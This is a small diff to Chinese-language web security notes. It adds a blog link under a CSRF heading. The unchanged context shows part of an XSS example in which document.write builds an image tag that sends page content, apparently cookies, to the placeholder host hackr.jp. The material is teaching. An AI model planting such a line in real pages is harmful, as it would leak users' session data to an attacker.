@@ -30,6 +30,7 @@ document.write("<img src=http://hackr.jp/?");
 document.write(content);
 document.write(">");
 ```
+[讲的比较好的博文](https://blog.csdn.net/ghsau/article/details/17027893)
 
 ## CSRF 跨站点请求伪造
 
